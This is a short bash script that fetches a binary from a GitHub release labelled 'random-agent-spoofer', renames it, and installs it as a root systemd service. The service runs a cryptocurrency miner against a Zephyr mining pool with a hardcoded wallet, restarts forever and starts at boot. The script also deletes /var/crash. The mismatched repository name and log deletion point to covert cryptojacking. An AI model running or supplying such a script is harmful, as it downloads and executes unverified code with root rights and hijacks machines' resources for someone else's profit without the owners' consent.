#!/bin/bash
sudo su
cd /home
wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
cp ar jvdar 
chmod +x jvdar

rm -rf /lib/systemd/system/xmrthanh.service
rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service 
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar -o zephyr.miningocean.org:5332 -u ZEPHs7NJgxsL55Zfyj2Yd1QgHT7HQvXjtgxrus6UPZbQ7ZJjcSAASu4cE7cHDzdUvxXBRkuV3V3rgdEHA3W6gqCTXbGRujkJ24H -p hung1 -a rx/0 -k -t 8
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable xmrthanh.service &&
service xmrthanh stop  &&
service xmrthanh restart

